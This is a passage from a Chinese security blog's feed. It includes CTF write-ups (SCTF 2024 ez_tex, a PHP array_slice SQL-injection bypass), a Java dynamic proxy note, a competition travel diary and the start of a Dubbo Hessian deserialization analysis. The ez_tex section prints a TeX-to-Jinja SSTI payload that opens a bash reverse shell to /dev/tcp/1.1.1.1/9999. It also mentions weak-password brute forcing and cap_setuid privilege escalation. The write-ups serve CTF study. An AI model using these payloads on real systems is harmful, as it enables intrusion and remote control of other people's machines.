UnicodeDecodeError: <br>                        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File content is not decodable&#x27;</span> <br>                <span class="hljs-keyword">for</span> bad_char <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;\\x&#x27;</span>, <span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-string">&#x27;write18&#x27;</span>, <span class="hljs-string">&#x27;immediate&#x27;</span>,<span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>]: <br>                        <span class="hljs-keyword">if</span> bad_char <span class="hljs-keyword">in</span> content_str: <br>                                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File content is not safe&#x27;</span> <br>                file.seek(<span class="hljs-number">0</span>) <br>                filename = secure_filename(file.filename) <br>                file_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename) <br>                file.save(file_path) <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File uploaded successfully, And you can compile the tex file&#x27;</span> <br>        <span class="hljs-keyword">else</span>: <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type or name&#x27;</span> <br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/compile&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compile</span>(): <br>        filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>) <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No filename provided&#x27;</span>, <span class="hljs-number">400</span> <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(filename) &gt;= <span class="hljs-number">7</span>: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file name length&#x27;</span>, <span class="hljs-number">400</span> <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename.endswith(<span class="hljs-string">&#x27;.tex&#x27;</span>): <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type&#x27;</span>, <span class="hljs-number">400</span> <br><br>        file_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename) <br>        <span class="hljs-built_in">print</span>(file_path) <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(file_path): <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File not found&#x27;</span>, <span class="hljs-number">404</span> <br><br>        output_pdf = compile_tex(file_path) <br>        <span class="hljs-keyword">if</span> output_pdf.endswith(<span class="hljs-string">&#x27;.pdf&#x27;</span>): <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Compilation succeeded&quot;</span> <br>        <span class="hljs-keyword">else</span>: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Compilation failed&#x27;</span>, <span class="hljs-number">500</span> <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/log&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">log</span>(): <br>        <span class="hljs-keyword">try</span>: <br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;app.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> log_file: <br>                log_contents = log_file.read() <br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;log.html&#x27;</span>, log_contents=log_contents) <br>        <span class="hljs-keyword">except</span> FileNotFoundError: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Log file not found&#x27;</span>, <span class="hljs-number">404</span> <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">3000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>直接ssti就出了。但是要重开靶机在第一次访问&#x2F;log之前写：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-keyword">\documentclass</span>[]&#123;article&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><span class="hljs-keyword">\newwrite</span><span class="hljs-keyword">\t</span><br><span class="hljs-keyword">\openout</span><span class="hljs-keyword">\t</span>=templates^^2flog.html<br><span class="hljs-keyword">\write</span><span class="hljs-keyword">\t</span>&#123;&#123;&#123;lipsum.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>globals<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>[&#x27;os&#x27;].popen(&#x27;bash -c &quot;^^2fbin^^2fsh -i &gt;<span class="hljs-built_in">&amp;</span> ^^2fdev^^2ftcp^^2f1.1.1.1^^2f9999 0&gt;<span class="hljs-built_in">&amp;</span>1&quot;&#x27;).read()&#125;&#125;&#125;<br><span class="hljs-keyword">\closeout</span><span class="hljs-keyword">\t</span><br><span class="hljs-keyword">\newpage</span><br>foo<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><p>反弹shell进去后没权限，它还给了个ssh，预期解是通过&#x2F;flag得知jerrywww用户名，然后爆破出弱密码P@ssw0rd，难绷。</p><p>W&amp;M打了个非预期：&#x2F;usr&#x2F;bin&#x2F;python3.11 cap_setuid&#x3D;ep</p><p><img src="/2024/10/05/sctf-web-learning/image-20241006000438952.png" alt="image-20241006000438952"></p><p>牛子。</p><h2 id="havefun"><a href="#havefun" class="headerlink" title="havefun"></a>havefun</h2><p>ruby反序列化都来了我草。后面研究研究。</p><p>（未完待续…）</p><p>参考：</p><p><a href="https://blog.wm-team.cn/index.php/archives/82/#ez_tex">SCTF 2024 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p><p>[SCTF2024 Web&amp;Misc 复现 | 0pium’s Blog (hack3r0pium.github.io)](<a href="https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&Misc-%E5%A4%8D%E7%8E%B0/index.html#:~:text=Web">https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&amp;Misc-复现/index.html#:~:text=Web</a> ezju)</p><p><a href="https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/#title-20">SCTF 2024 Writeup - 星盟安全团队 (xmcve.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java Dynamic Proxy</title>
    <link href="/2024/09/27/Java-Dynamic-Proxy/"/>
    <url>/2024/09/27/Java-Dynamic-Proxy/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复习一下Java动态代理。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>为啥要用动态代理？</p><p>我觉得我们不能从What开始学，直接学啥是动态代理直接能直接给人看懵逼。</p><p>我们从Why的角度开始学，为什么需要动态代理？</p><p>动态代理其实就是一个动态生成子类的方法，看起来写出来一堆东西，但是针对Java这个静态语言，却是非常有用的。</p><p>试想，你有一个大的Java项目，现在你想改动一个类中的某个方法，如果不使用动态代理的方式，那你就会面临一个困境–你需要把源文件修改了，然后再拿去编译、运行，甚至有些地方引用了这个方法但不希望更改也需要重新设一个再改回去。</p><p>但是如果你使用了动态代理，这个方法就是动态生成的，你就直接可以在不重新编译的情况下直接更改类中的方法然后应用到当前模块中，这对于整个项目来说效率都是非常高的，而且可变性可延展性都非常强大。配合反射的时候，往往你只需要更改一下类的输入或者配置文件就能一步到位。</p><p>这里可以举一个例子来说明动态代理的实现：</p><p><strong>就好比你建了一栋房子，但是你需要把你最底下的某个砖头换了，如果没用动态代理，你就必须把你的房子掀了再去找到这个砖头然后更换。但使用了动态代理后，就相当于它能自动帮你生成符合你需求的完美砖头并应用成功，根本就不需要你掀了整个房子。</strong></p><p>这里直接引入Proxy。</p><p>Proxy 是设计模式中的一种。当需要在已存在的 class 上添加或修改功能时，可以通过创建 proxy object 来实现</p><p>通常 proxy object 和被代理对象拥有相同的方法，并且拥有被代理对象的引用，可以调用其方法。</p><p>代理模式<a href="https://javax0.wordpress.com/2016/01/20/java-dynamic-proxy">应用场景</a>包括</p><ul><li>在方法执行前后打印和记录日志</li><li>认证、参数检查</li><li>lazy instantiation (Hibernate, Mybatis)</li><li>AOP (transaction)</li><li>mocking</li><li>…</li></ul><p>代理有两种实现方式</p><ul><li>静态代理：在编译时期，创建代理对象</li><li>动态代理：在运行时期，动态创建</li></ul><p>对于重复性工作，如打印日志，静态代理需要为每个 class 都创建 proxy class，过程繁琐和低效，而动态代理通过使用反射在运行时生成 bytecode 的方式来实现，更加方便和强大</p><p>后续可看<a href="https://b1ngz.github.io/java-dynamic-proxy/">Java Dynamic Proxy | b1ngz</a>，总结的很不错，我就不再赘述了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯Final-小记</title>
    <link href="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/"/>
    <url>/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>这次本科组第二！</p><p>（第一是我们天枢学长，tql，直接把靶场打穿ak了）</p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143449487.png" alt="image-20240915143449487"></p><p>（这里不得不提一个7月份的sb比赛，我们打到全国总冠军都不给奖金和奖杯，主办方还装死……）</p><p>我不打算记final怎么打的，但也确实不好记，多网卡跳来跳去的，也没咋记录，有点难绷……</p><p>所以记一下广州之旅吧~~</p><h2 id="上飞机喽"><a href="#上飞机喽" class="headerlink" title="上飞机喽"></a>上飞机喽</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143510190.png" alt="image-20240915143510190"></p><h2 id="天气很好"><a href="#天气很好" class="headerlink" title="天气很好"></a>天气很好</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143525788.png" alt="image-20240915143525788"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143539210.png" alt="image-20240915143539210"></p><h2 id="下面赶到战场的是，天枢渗透真神F4（偷拍学长背影）："><a href="#下面赶到战场的是，天枢渗透真神F4（偷拍学长背影）：" class="headerlink" title="下面赶到战场的是，天枢渗透真神F4（偷拍学长背影）："></a>下面赶到战场的是，天枢渗透真神F4（偷拍学长背影）：</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143555579.png" alt="image-20240915143555579"></p><h2 id="比赛现场好气派（比某个7月参加的sb比赛好太多了）"><a href="#比赛现场好气派（比某个7月参加的sb比赛好太多了）" class="headerlink" title="比赛现场好气派（比某个7月参加的sb比赛好太多了）"></a>比赛现场好气派（比某个7月参加的sb比赛好太多了）</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143645219.png" alt="image-20240915143645219"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143706815.png" alt="image-20240915143706815"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143712249.png" alt="image-20240915143712249"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143717455.png" alt="image-20240915143717455"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143724555.png" alt="image-20240915143724555"></p><h2 id="参赛参赛"><a href="#参赛参赛" class="headerlink" title="参赛参赛"></a>参赛参赛</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143800698.png" alt="image-20240915143800698"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143805958.png" alt="image-20240915143805958"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143811289.png" alt="image-20240915143811289"></p><h2 id="光荣下播"><a href="#光荣下播" class="headerlink" title="光荣下播"></a>光荣下播</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143820614.png" alt="image-20240915143820614"></p><h2 id="上新闻！！！"><a href="#上新闻！！！" class="headerlink" title="上新闻！！！"></a>上新闻！！！</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143832223.png" alt="image-20240915143832223"></p><h2 id="北京上空"><a href="#北京上空" class="headerlink" title="北京上空"></a>北京上空</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143852287.png" alt="image-20240915143852287"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143856062.png" alt="image-20240915143856062"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143900232.png" alt="image-20240915143900232"></p><h2 id="故事还在续写，世界终将聚焦于你我"><a href="#故事还在续写，世界终将聚焦于你我" class="headerlink" title="故事还在续写，世界终将聚焦于你我"></a>故事还在续写，世界终将聚焦于你我</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143928869.png" alt="image-20240915143928869"></p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>京津冀攻防-array_slice绕过</title>
    <link href="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/"/>
    <url>/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目不难，但是为什么我要写这么一个小比赛，因为我爆零了。</p><p>对，致敬传奇爆零web手<strong>EddieMurphy</strong>。</p><p>路还很长，确实还很长。</p><h2 id="浅析"><a href="#浅析" class="headerlink" title="浅析"></a>浅析</h2><p>前面的绕过很简单，data伪协议就能进，php伪协议就能读<code>sql_unlimited.php</code>，然后是就是这个源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;toor&quot;</span>,<span class="hljs-string">&quot;unlimited&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())&#123;<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;connecte failed%s&lt;br&gt;&quot;</span>,<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_sel</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>))&#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;mysqli&#x27;</span>]-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from info where id in (<span class="hljs-subst">$id</span>)&quot;</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-keyword">list</span>(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$message</span>)=<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_row</span>())&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27;ï¼&#x27;</span>.<span class="hljs-variable">$message</span>.<span class="hljs-string">&#x27;&lt;/li&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br>    <br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_co</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$post</span>=<span class="hljs-variable">$_POST</span>;<br>    <span class="hljs-keyword">if</span> (@!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;id&#x27;</span>][<span class="hljs-number">0</span>]) || @!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;id&#x27;</span>][<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO! NO! NO! The Parameters must be numeric&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">sql_sel</span>(<span class="hljs-title function_ invoke__">array_slice</span>(<span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-number">0</span>,<span class="hljs-number">2</span>));<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No Permissions&#x27;</span>);   <br>    <br>&#125;<br><span class="hljs-title function_ invoke__">do_co</span>();<br></code></pre></td></tr></table></figure><p>一开始傻傻的我还以为直接打十六进制，但是确实本地打不通，黔驴技穷。</p><p>和赵哥一直交流也是，没有什么clues，以及那道tomcat的编码上传也是，没有过多接触这些题也让我疲于应付。</p><p>但是SE学长一语道破（tql，这才是真正的赛棍），直接看到源码的<code>array_slice()</code>，来自：<a href="https://xz.aliyun.com/t/2087">https://xz.aliyun.com/t/2087</a>:</p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003559993.png" alt="image-20240908003559993"></p><p>结束了，一切都结束了。</p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003056564.png" alt="image-20240908003056564"></p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003638173.png" alt="image-20240908003638173"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>但是，晚了。</p><p>队友把其他方向AK又如何，你的web爆零了。</p><p>排名第一又如何，因为跟你无关。</p><p>晚上出去drink了点🍺，独自骑行在回来的路上，路真的很长。</p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003742077.png" alt="image-20240908003742077"></p><p><strong>蜀道难，难于上青天。</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dubbo</title>
    <link href="/2024/09/02/Dubbo/"/>
    <url>/2024/09/02/Dubbo/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>趁着还没啥比赛，小学期等组长回复，看看Dubbo反序列化。</p><p>但是Dubbo反序列化根据版本不同，POC也挺多的，而且光这个Dubbo协议学起来就有一点难绷。</p><p>先来看看什么是Dubbo：</p><p>Apache Dubbo是一款阿里巴巴开源的轻量、高性能的Java RPC框架</p><p>随着微服务的盛行，除开服务调用之外，Dubbo也逐渐涉猎服务治理、服务监控、服务网关等，往Spring Cloud靠拢。</p><p>Dubbo RPC支持多种序列化方式：dubbo、hessian2、kryo、fastjson、java等。</p><p><img src="/2024/09/02/Dubbo/image-20240902162941056.png" alt="image-20240902162941056"></p><p><img src="/2024/09/02/Dubbo/image-20240902163349526.png" alt="image-20240902163349526"></p><p>Dubbo的搭建就免了，网上有太多太多，跟着搭就行了。</p><p><a href="https://github.com/apache/dubbo-samples">https://github.com/apache/dubbo-samples</a></p><p>使用Dubbo服务需要有一个注册中心zookeeper</p><p><a href="https://zookeeper.apache.org/releases.html">https://zookeeper.apache.org/releases.html</a></p><h2 id="Dubbo-Attack"><a href="#Dubbo-Attack" class="headerlink" title="Dubbo-Attack"></a>Dubbo-Attack</h2><h3 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h3><h4 id=""><a href="#" class="headerlink" title="&lt;&#x3D;2.7.6"></a>&lt;&#x3D;2.7.6</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>影响范围：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">2.7</span><span class="hljs-number">.0</span> &lt;= Dubbo Version &lt;= <span class="hljs-number">2.7</span><span class="hljs-number">.6</span><br><span class="hljs-number">2.6</span><span class="hljs-number">.0</span> &lt;= Dubbo Version &lt;= <span class="hljs-number">2.6</span><span class="hljs-number">.7</span><br>Dubbo 所有 <span class="hljs-number">2.5</span>.x 版本（官方团队目前已不支持）<br></code></pre></td></tr></table></figure><p>这里主要是因为dubbo默认通过hessian协议进行反序列化造成的漏洞，环境可看：</p><p><a href="https://github.com/apache/dubbo-spring-boot-project">https://github.com/apache/dubbo-spring-boot-project</a></p><p>可以在pom.xml中条件利用依赖，有有很多利用链，根据有什么依赖打什么链。</p><p>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">SpringPartiallyComparableAdvisorHolder<br>SpringAbstractBeanFactoryPointcutAdvisor<br>Rome<br>ROME+CC<br>Groovy<br></code></pre></td></tr></table></figure><p>等等。</p><p>以JNDI注入打ROME+CC为例：</p><p>调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">connect:<span class="hljs-number">624</span>, JdbcRowSetImpl (com.sun.rowset)<br>getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com.sun.rowset)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2703</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2278</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2080</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2074</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">92</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)<br>decode:<span class="hljs-number">139</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">79</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">57</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>received:<span class="hljs-number">44</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>run:<span class="hljs-number">57</span>, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)<br>runWorker:<span class="hljs-number">1149</span>, ThreadPoolExecutor (java.util.concurrent)<br>run:<span class="hljs-number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>环境搭建偷个懒，直接贴图分析一波。</p><p>前面都是方法的触发调用，我们直接看到<code>DecodeHandler#received</code>：</p><p><img src="/2024/09/02/Dubbo/image-20240903165421675.png" alt="image-20240903165421675"></p><p>跟进到无参方法：</p><p><img src="/2024/09/02/Dubbo/image-20240903165444785.png" alt="image-20240903165444785"></p><p>这里的inputStream是去掉Dubbo协议头的原始数据：</p><p><img src="/2024/09/02/Dubbo/image-20240903165535368.png" alt="image-20240903165535368"></p><p>此处获取了数据体的各个信息，其次进行数据处理后：</p><p><img src="/2024/09/02/Dubbo/image-20240903165632577.png" alt="image-20240903165632577"></p><p>看到readObject了，这里的in是<code>Hessian2ObjectInput</code>输入流对象，继续调用<code>readObject</code>方法，</p><p>继续调用<code>readObject</code>方法，之后会在readObject方法调用中计算出tag标识</p><p><img src="/2024/09/02/Dubbo/image-20240903165759294.png" alt="image-20240903165759294"></p><p>之后通过switch case语句进行对应逻辑调用:</p><p><img src="/2024/09/02/Dubbo/image-20240903165817817.png" alt="image-20240903165817817"></p><p>来到了<code>MapDerializer#readMap</code>的调用，后面就是hessian链了：</p><p><img src="/2024/09/02/Dubbo/image-20240903165926476.png" alt="image-20240903165926476"></p><p>后续跟进就不写了，可以去看原文章：<a href="https://tttang.com/archive/1730/#toc_hessian">Dubbo反序列化漏洞分析集合1 - 跳跳糖 (tttang.com)</a></p><h5 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h5><p>根据diff分析</p><p><a 